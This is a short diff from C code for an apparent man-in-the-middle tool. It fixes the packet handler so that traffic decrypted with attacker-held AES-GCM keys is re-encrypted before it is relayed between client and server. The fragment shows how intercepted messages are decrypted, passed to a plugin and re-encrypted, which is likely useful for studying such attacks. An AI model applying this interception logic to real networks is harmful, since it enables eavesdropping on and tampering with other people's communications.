@@ -196,13 +196,13 @@ void pkt_hdl4man_in_middle(u_char *args, const struct pcap_pkthdr *pkthdr, const
                     printf("\033[1;36mreceived from client: %s(%ld), send to server\n\033[0m",
                            out_buff, strlen((char *) out_buff));
                     plugin_func(out_buff, strlen((char *) out_buff));
-                    dh_aes_256_gcm_decrypt(KEY4ATTACKER2SERVER, out_buff, strlen((char *) out_buff), tcp_data + 3);
+                    dh_aes_256_gcm_encrypt(KEY4ATTACKER2SERVER, out_buff, strlen((char *) out_buff), tcp_data + 3);
                 } else {
                     dh_aes_256_gcm_decrypt(KEY4ATTACKER2SERVER, tcp_data + 3, *(tcp_data + 2), out_buff);
                     printf("\033[1;32mreceived from server: %s(%ld), send to client\n\033[0m",
                            out_buff, strlen((char *) out_buff));
                     plugin_func(out_buff, strlen((char *) out_buff));
-                    dh_aes_256_gcm_decrypt(KEY4CLIENT2ATTACKER, out_buff, strlen((char *) out_buff), tcp_data + 3);
+                    dh_aes_256_gcm_encrypt(KEY4CLIENT2ATTACKER, out_buff, strlen((char *) out_buff), tcp_data + 3);
                 }
             }
             // recalculate the packet
